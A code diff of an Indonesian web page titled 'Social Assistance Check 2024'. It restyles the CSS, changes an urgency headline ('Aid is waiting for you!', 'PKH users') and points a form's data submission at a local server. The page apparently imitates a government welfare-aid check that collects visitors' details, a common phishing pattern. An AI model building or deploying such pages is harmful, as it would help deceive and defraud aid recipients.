@@ -6,143 +6,160 @@
     <title>Pengecekan Bantuan Sosial 2024</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            padding: 0;
-        }
-        .container {
-            max-width: 600px;
-            margin: 50px auto;
-            background: #ffffff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-        }
-        h1 {
-            text-align: center;
-            color: #007bff;
-            margin-bottom: 20px;
-            font-size: 1.5em;
-            height: 40px;
-            overflow: hidden;
-            white-space: nowrap;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #333;
-        }
-        input[type="text"],
-        input[type="email"],
-        input[type="tel"],
-        textarea {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ced4da;
-            border-radius: 5px;
-            box-sizing: border-box;
-            font-size: 16px;
-        }
-        textarea {
-            resize: vertical;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s, transform 0.2s;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        button:active {
-            transform: scale(0.95);
-            box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
-        }
-        footer {
-            text-align: center;
-            margin-top: 10px;
-            padding: 10px;
-            background-color: gray;
-            color: white;
-            border-radius: 0 0 0px 0px;
-            position: relative;
-            overflow: hidden;
-        }
-        footer:before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 300%;
-            height: 300%;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            animation: pulse 6s infinite;
-            z-index: 0;
-            transform: translate(-50%, -50%);
-        }
-        @keyframes pulse {
-            0% {
-                transform: translate(-50%, -50%) scale(0.5);
-                opacity: 1;
-            }
-            100% {
-                transform: translate(-50%, -50%) scale(1);
-                opacity: 0;
-            }
-        }
-        .footer-content {
-            position: relative;
-            z-index: 1;
-        }
-        .footer-links {
-            margin: 10px 0;
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-        }
-        .footer-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: bold;
-            transition: color 0.3s;
-        }
-        .footer-links a:hover {
-            color: #e7f1ff;
-        }
-        .footer-social-icons {
-            margin-top: 10px;
-        }
-        .footer-social-icons a {
-            color: white;
-            margin: 0 10px;
-            font-size: 20px;
-            transition: color 0.3s;
-        }
-        .footer-social-icons a:hover {
-            color: #e7f1ff;
-        }
-        @media (max-width: 600px) {
-            .container {
-                padding: 20px;
-            }
-            button {
-                padding: 10px;
-                font-size: 14px;
-            }
-        }
+      * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Poppins', sans-serif;
+}
+
+body {
+    background-color: #f0f2f5;
+    color: #333;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh; /* Membuat tinggi minimal 100% viewport */
+}
+
+.container {
+    background: linear-gradient(135deg, #ffffff, #f7f9fc);
+    padding: 30px;
+    border-radius: 16px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+    width: 100%;
+    max-width: 500px;
+    text-align: center;
+    margin: auto; /* Membuat container berada di tengah halaman */
+}
+
+.icon {
+    font-size: 60px;
+    color: #ff6b6b;
+    margin-bottom: 15px;
+}
+
+h1 {
+    font-size: 26px;
+    font-weight: 600;
+    color: #333;
+    margin-bottom: 25px;
+    letter-spacing: 1px;
+}
+
+.form-group {
+    margin-bottom: 20px;
+    text-align: left;
+}
+
+.form-group label {
+    display: block;
+    font-weight: 500;
+    color: #555;
+    margin-bottom: 8px;
+}
+
+.form-group input,
+.form-group textarea {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    font-size: 15px;
+    transition: border-color 0.3s ease;
+}
+
+.form-group input:focus,
+.form-group textarea:focus {
+    border-color: #ff6b6b;
+    outline: none;
+}
+
+textarea {
+    resize: vertical;
+}
+
+button {
+    background-color: #ff6b6b;
+    color: #fff;
+    padding: 12px 20px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 16px;
+    font-weight: 600;
+    transition: background-color 0.3s ease;
+    width: 100%;
+}
+
+button:hover {
+    background-color: #e84141;
+}
+
+footer {
+    margin-top: auto; /* Membuat footer tetap di bawah */
+    padding: 20px 0;
+    background-color: #fff;
+    text-align: center;
+    font-size: 14px;
+    border-top: 1px solid #ccc;
+}
+
+.footer-content {
+    padding-top: 10px;
+}
+
+.footer-links a {
+    margin: 0 15px;
+    text-decoration: none;
+    color: #555;
+    font-weight: 500;
+}
+
+.footer-links a:hover {
+    text-decoration: underline;
+    color: #ff6b6b;
+}
+
+.footer-social-icons a {
+    color: #555;
+    margin: 0 15px;
+    font-size: 22px;
+    text-decoration: none;
+    transition: color 0.3s ease;
+}
+
+.footer-social-icons a:hover {
+    color: #ff6b6b;
+}
+
+/* Media queries untuk tampilan mobile */
+@media (max-width: 600px) {
+    body {
+        padding: 15px;
+    }
+
+    .container {
+        padding: 20px;
+    }
+
+    h1 {
+        font-size: 22px;
+    }
+
+    button {
+        padding: 10px 16px;
+        font-size: 14px;
+    }
+
+    .form-group input,
+    .form-group textarea {
+        font-size: 14px;
+    }
+
+    .icon {
+        font-size: 48px;
+    }
+}
     </style>
 </head>
 <body>
@@ -202,7 +219,7 @@
     // Efek mengetik pada judul
     var phrases = [
         "Cek Sekarang!",
-        "Jangan Lewatkan!",
+        "Pengguna PKH",
         "Bantuan Menunggu Anda!",
         "Segera Periksa!",
         "Dapatkan Bantuan Anda!"
@@ -244,7 +261,7 @@
         var data = Object.fromEntries(formData.entries());
 
         // Mengirim data ke server
-        fetch('/submit', {
+        fetch('http://localhost:3000/submit', { // Sesuaikan URL ke port server
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
